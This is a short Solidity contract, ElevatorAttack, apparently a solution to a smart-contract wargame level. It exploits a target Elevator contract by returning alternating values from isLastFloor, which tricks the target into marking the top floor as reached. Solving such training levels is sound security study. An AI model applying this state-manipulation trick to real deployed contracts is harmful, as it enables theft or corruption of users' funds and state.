pragma solidity ^0.6.10;

import './Elevator.sol';

contract ElevatorAttack {
    bool public togle = true;
    Elevator public target; 

    constructor(address _targetAddress) public { 
        target = Elevator(_targetAddress);
    }    

    function isLastFloor(uint) public returns (bool) {
        togle = !togle;
        return togle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
